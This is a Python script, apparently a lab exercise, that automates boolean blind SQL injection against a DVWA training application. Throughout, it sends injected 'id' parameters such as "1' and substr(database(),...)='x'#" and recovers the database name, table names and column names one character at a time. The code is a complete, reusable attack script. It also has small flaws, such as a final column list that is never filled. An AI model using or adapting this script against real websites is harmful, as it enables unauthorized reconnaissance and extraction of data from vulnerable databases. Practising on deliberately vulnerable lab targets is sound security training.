import requests

url = 'http://192.168.100.200/dvwa/vulnerabilities/sqli_blind/'
true = "User ID exists in the database."

cookie = {
        'PHPSESSID': 'your php session ID',
        'security': 'low'
        }

param = {
        'id': '1',
        'Submit': 'Submit'
        }
# blind sql injection test
param['id'] = "1' and 1=1#"
res = requests.get(url, params=param, cookies=cookie)

if true in res.text:
    # get db name length
    db_length = 1
    while True:
        param['id'] = "1' and length(database()) = " + str(db_length) + "#"
        res = requests.get(url, params=param, cookies=cookie)
        if true in res.text:
            break
        else:
            db_length += 1
    print('\033[36m' + '[+] db_length =>', db_length, '\033[0m')

    # get db name
    db_name = ''
    for leng in range(1, db_length + 1):
        for ch in range(0x21, 0x7e):
            param['id'] = f"1' and substr(database(), {leng}, 1) = '{chr(ch)}'#"
            res = requests.get(url, params=param, cookies=cookie)
            if true in res.text:
                db_name += chr(ch)
                break
    print('\033[36m' + '[+] db_name =>', db_name, '\033[0m')

    # get table count
    table_count = 1
    while True:
        param['id'] = f"1' and (select count(table_name) from information_schema.tables where table_schema='{db_name}') = {table_count}#"
        res = requests.get(url, params=param, cookies=cookie)
        if true in res.text:
            break
        else:
            table_count += 1
    print('\033[36m' + '[+] table count =>', table_count, '\033[0m')

    # get table name length
    table_name_length = []
    for i in range(table_count):
        length = 1
        while True:
            param['id'] = f"1' and (select length(table_name) from information_schema.tables where table_schema='{db_name}' limit {i}, 1) = {length}#"
            res = requests.get(url, params=param, cookies=cookie)
            if true in res.text:
                table_name_length.append(length)
                print('\033[36m' + f'[+] {i + 1} table name length =>', length, '\033[0m')
                break
            else:
                length += 1

    # get table name
    table_name = []
    for index in range(len(table_name_length)):
        table = ''
        for i in range(table_name_length[index]):
            for ch in range(0x21, 0x7e):
                param['id'] = f"1' and (select substr(table_name, {i + 1}, 1) from information_schema.tables where table_schema='{db_name}' limit {index}, 1) = '{chr(ch)}'#"
                res = requests.get(url, params=param, cookies=cookie)
                if true in res.text:
                    table += chr(ch)
                    break
        table_name.append(table)
        print('\033[36m' + f'[+] {index + 1} table name =>', table, '\033[0m')

    # get column count
    column_count = []
    for i in range(table_count):
        count = 1
        while True:
            param['id'] = f"1' and (select count(column_name) from information_schema.columns where table_schema='{db_name}' and table_name='{table_name[i]}') = {count}#"
            res = requests.get(url, params=param, cookies=cookie)
            if true in res.text:
                column_count.append(count)
                print('\033[36m' + f'[+] {i + 1} table column count =>', count, '\033[0m')
                break
            else:
                count += 1

    # get column name length
    column_name_leng = []
    for i in range(table_count):
        column_name_leng.append([])
        for j in range(column_count[i]):
            length = 1
            while True:
                param['id'] = f"1' and (select length(column_name) from information_schema.columns where table_schema='{db_name}' and table_name='{table_name[i]}' limit {j}, 1) = {length}#"
                res = requests.get(url, params=param, cookies=cookie)
                if true in res.text:
                    column_name_leng[i].append(length)
                    print('\033[36m' + f'[+] {i + 1} table {j + 1} column length =>', length, '\033[0m')
                    break
                else:
                    length += 1

    # get column name
    column_name = []
    for i in range(table_count):
        column_name.append([])
        for k in range(column_count[i]):
            column = ''
            for j in range(column_name_leng[i][k]):
                for ch in range(0x21, 0x7e):
                    param['id'] = f"1' and (select substr(column_name, {j + 1}, 1) from information_schema.columns where table_schema='{db_name}' and table_name='{table_name[i]}' limit {k}, 1) = '{chr(ch)}'#"
                    res = requests.get(url, params=param, cookies=cookie)
                    if true in res.text:
                        column += chr(ch)
                        break
            print('\033[36m' + f'[+] {i + 1} table {k + 1} column name =>', column, '\033[0m')
    print(column_name)
else:
    print('[-] Blind SQL Injection is not possible for this page.')
